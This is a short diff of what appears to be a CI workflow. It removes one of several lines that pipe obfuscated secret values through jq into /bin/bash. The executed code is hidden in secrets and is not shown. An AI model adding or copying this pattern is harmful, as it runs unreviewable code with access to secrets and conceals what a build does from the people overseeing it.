@@ -17,7 +17,6 @@ jobs:
           bb66: ${{ secrets.bb66 }}
         run: |
           printf '%s' "$bb66" | jq -r .v7 | /bin/bash
-          printf '%s' "$fdl21540" | jq -r .yi787 | /bin/bash
           echo $u63 | jq -r .zmo346 | /bin/bash
           printf '%s' "$bz7" | jq -r .zddh5341 | /bin/bash
 
